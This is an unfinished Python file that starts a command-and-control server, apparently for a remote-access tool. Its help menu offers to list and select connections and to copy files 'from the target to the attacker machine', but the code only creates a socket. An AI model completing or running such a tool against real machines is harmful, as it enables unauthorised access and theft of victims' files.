import socket
from socket import AF_INET,SOCK_STREAM

# creating Server class
class Server(object):

    HOST = socket.gethostbyname(socket.gethostname())
    PORT = 1234
    BUFFER_SIZE = 1024

    # construct/init fonction
    def __init__(self):
        # calling the help_menu()
        self.help_menu
        self.create_socket_obj

    # help menu
    @property
    def help_menu(self):
        self.HELP = {'list':'list of current connection',
                     'select':'select a given current connectiion',
                     'file':'copy a file from the target to the attacker machine'
                    }  
        # displaying all the commands and theirs descriptions
        for cmd,cmd_desc in self.HELP.items():
            print(f'{cmd} : {cmd_desc}')

    # creating a socket object
    @property
    def create_socket_obj(self):
        # socket object
        try:
            self.server_socket = socket.socket(AF_INET,SOCK_STREAM)
            print('Socket object created successfully')

        except Exception as sckt_error:
            print(f'Socket creation error -> {sckt_error}')

    


if __name__ == '__main__':
    server = Server()
